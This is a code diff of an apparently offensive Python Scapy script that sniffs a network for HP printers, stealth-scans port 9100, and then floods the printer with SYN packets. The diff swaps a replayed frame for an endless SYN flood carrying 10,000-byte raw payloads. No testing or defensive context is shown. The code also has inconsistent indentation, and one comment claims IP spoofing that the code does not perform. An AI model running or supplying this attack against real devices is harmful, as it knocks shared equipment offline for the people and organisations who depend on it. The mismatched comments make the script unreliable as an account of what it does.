@@ -22,9 +22,16 @@ while True:
 	if(stealth_scan_hp.getlayer(TCP).flags == 0x12): #0x12 -> syn ack -> the port is open
 	#send reset to complete the scan
 		send_rst = sr(IP(dst=printer_possible_ip)/TCP(dport=aw_printing_port,flags='R'),timeout=10)
-	#start dos attack
-		sendp(frames[0],loop=1)
-	#after the dos attack, we continue trying to sniff if anyone is connecting to a hp printer(going back to the while loop)
+        
+	#start dos attack (SYN Flooding Attack)
+		hp_ip = IP(dst=printer_possible_ip)
+        #set src address to a spoofed random IP address in the private network range 
+     	  	hp_tcp = TCP(sport=RandShort(), dport=80, flags="S")
+	#sending raw data
+        	hp_raw = Raw(b"X" * 10000) 
+        	dos_packet = hp_ip / hp_tcp / hp_raw
+        	send(dos_packet,loop=1, verbose=0)
+	
 	
 	
 	
@@ -36,7 +43,7 @@ while True:
 # - mac address of hp devices starts with 9C:7B:EF)
 # we are going to preferm a stealth scan using our capturd destination IP address and port 9100 (raw ptinting) over tcp to see if we manage to get any response
 # - there for this is a hp printer (because it uses raw printing protocol) .
-# if it is a hp printer, were going to send a reset and start a dos attack.		
+# if it is a hp printer, were going to send a reset and start a dos attack(SYN Flooding Attack ).		
 
 
 
